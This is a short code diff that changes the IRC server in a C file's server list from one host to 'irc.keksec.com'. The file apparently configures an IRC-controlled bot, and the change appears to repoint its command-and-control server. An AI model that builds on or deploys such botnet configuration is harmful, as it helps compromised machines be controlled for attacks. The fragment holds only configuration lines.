@@ -74,7 +74,7 @@
 #define KEY ""		// The key of the channel
 int numservers=1;		// Must change this to equal number of servers down there
 char *servers[] = {		// List the servers in that format, always end in (void*)0
-        "irc.kekthepla.net",
+        "irc.keksec.com",
         (void*)0
 };
 ////////////////////////////////////////////////////////////////////////////////
